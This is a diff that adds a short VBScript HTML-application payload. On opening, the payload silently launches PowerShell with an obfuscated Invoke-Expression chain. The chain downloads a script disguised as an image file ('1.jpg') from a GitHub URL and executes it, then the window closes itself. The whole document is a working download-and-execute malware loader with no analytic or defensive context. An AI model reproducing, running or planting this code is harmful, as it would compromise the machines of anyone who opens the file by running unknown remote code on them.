@@ -1,0 +1,8 @@
+<script language="VBScript">
+Function var_func()
+CreateObject("Wscript.Shell").Run "Powershell.exe  -noexit $c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/hisin3/st/main/1.jpg'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')|I`E`X",0
+
+End Function
+var_func
+self.close
+</script>
